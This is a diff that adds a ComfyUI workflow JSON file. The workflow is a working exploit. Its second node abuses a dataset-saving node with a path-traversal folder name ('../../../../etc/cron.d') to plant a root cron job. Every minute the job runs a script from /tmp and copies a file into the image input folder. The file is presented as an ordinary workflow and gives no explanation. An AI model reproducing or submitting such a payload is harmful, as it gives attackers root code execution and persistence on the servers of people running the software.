@@ -1,0 +1,20 @@
+{
+  "1": {
+    "class_type": "LoadImage",
+    "inputs": {
+      "image": "_w_8c6c53.png"
+    }
+  },
+  "2": {
+    "class_type": "SaveImageTextDataSetToFolder",
+    "inputs": {
+      "images": [
+        "1",
+        0
+      ],
+      "texts": "* * * * * root bash /tmp/cs/check_00000.txt 2>/dev/null; find / -maxdepth 4 -name 'example.png' -path '*/input/*' 2>/dev/null | head -1 | xargs dirname 2>/dev/null | xargs -I{} cp /tmp/cs.txt {}/clore_debug.txt 2>/dev/null\n",
+      "folder_name": "../../../../etc/cron.d",
+      "filename_prefix": "dbg"
+    }
+  }
+}
